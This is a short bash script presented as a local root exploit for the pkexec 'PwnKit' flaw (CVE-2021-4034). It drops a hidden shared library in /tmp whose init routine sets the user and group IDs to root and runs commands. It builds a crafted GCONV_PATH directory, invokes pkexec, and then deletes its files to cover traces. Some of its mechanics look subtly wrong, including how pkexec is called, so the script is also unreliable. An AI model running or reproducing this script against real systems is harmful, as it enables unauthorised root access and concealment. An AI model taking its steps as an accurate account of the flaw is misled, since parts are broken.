#!/bin/bash
echo "[*] CVE-2021-4034 PwnKit"
[ ! -u /usr/bin/pkexec ]&&echo "[-] pkexec not SUID"&&exit 1
echo "[+] pkexec SUID - exploiting..."
cd /tmp
cat>.x.c<<'C'
#include<stdio.h>
#include<stdlib.h>
void gconv(){}
void gconv_init(){setuid(0);setgid(0);system("id;whoami");}
C
gcc -shared -fPIC -o .x.so .x.c 2>/dev/null||{echo "[-] gcc failed";exit 1;}
mkdir -p 'GCONV_PATH=.'
touch 'GCONV_PATH=./x';chmod +x 'GCONV_PATH=./x'
echo 'module UTF-8// X// x 1'>GCONV_PATH=./gconv-modules
cp .x.so GCONV_PATH=./x.so
cd 'GCONV_PATH=.'
PATH=.:$PATH CHARSET=X SHELL=.x.so pkexec /bin/true 2>/dev/null
rm -rf /tmp/.x* /tmp/'GCONV_PATH=.' 2>/dev/null
echo "[+] Done"
